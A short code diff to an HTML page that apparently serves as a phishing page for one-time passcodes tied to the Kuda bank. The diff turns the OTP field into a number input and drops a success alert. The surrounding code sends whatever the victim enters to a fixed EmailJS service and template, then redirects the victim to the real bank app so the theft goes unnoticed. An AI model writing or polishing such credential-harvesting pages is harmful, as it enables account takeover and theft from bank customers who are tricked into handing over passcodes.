@@ -20,7 +20,7 @@
                 <p class="text-2xl font-bold mb-6">Hey, there!</p>
             </div>
             <p class="label text-left text-sm font-semibold">OTP</p>
-            <input class="w-full p-3 my-1" type="email" name="email" id="email" placeholder="Enter OTP" required>
+            <input class="w-full p-3 my-1" type="number" name="email" id="email" placeholder="Enter OTP" required>
             <input type="hidden" name="_captcha" value="false">
             <!-- <p class="label text-left text-sm font-semibold mt-4">Password</p>
             <input class="w-full p-3 my-1" type="password" name="password" id="password" placeholder="••••••••••" required>
@@ -42,7 +42,6 @@
             emailjs.sendForm('service_ia0lisq', 'template_vpyhx1m', this)
                 .then(function(response) {
                     console.log('Sent successfully:', response);
-                    alert('Message sent successfully!');
 
                     // Redirect to "pin.html" after successful email send
                     window.location.href = 'https://app.kuda.com/';
